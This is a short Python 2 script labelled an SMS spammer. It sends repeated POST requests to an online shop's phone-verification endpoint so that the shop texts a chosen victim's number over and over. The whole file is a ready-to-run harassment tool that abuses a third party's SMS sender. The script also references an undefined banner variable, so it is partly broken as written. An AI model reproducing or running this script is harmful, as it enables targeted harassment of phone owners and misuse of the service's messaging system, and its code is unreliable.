# spam.py - Spammer SMS
# CyberLegacyXploit

import sys
import time
import requests

tes= """
 ____________ 
< SMS Spammer >
 ------------ 
   \         ,        ,
    \       /( Kizuka )\
     \      \ \___   / |
            /- _  `-/  '
           (/\/ \ \   /\
           / /   | `    \
           X X   ) /    |
           `-^--'`<     '
          (_.)  _  )   /
           `.___/`    /
             `-----' /
<----.     __ / __   \  
<----|====O)))==) \) /====
<----'    `--' `.__,' \
             |        |
              \       /
        ______( (_  / \______
      ,'  ,-----'   |        \
      `--{__________)        \/
"""
def spam():
	jumlah=sys.argv[1].split("=")[1:]
	jumlah=jumlah[0]
	jumlah=int(jumlah)
	phone=sys.argv[2]
	print __banner__
	param = {'phone':''+sys.argv[2],'smsType':'1'}
	count = 0
	while (count < jumlah):
		r = requests.post('http://sc.jd.id/phone/sendPhoneSms', data=param)
		if '"success":true' in r.text:
			print("Terkirim :D")
		else:
			print("Gagal Mengirim :(")
		time.sleep(1)
		count = count + 1
	print("Successful^-^")
	sys.exit(1)

if __name__ == '__main__':
	if len(sys.argv) != 3:
		print __banner__
		print "Usage: jdid.py --count=10 PHONE"
		sys.exit(0)
	else:
		spam()
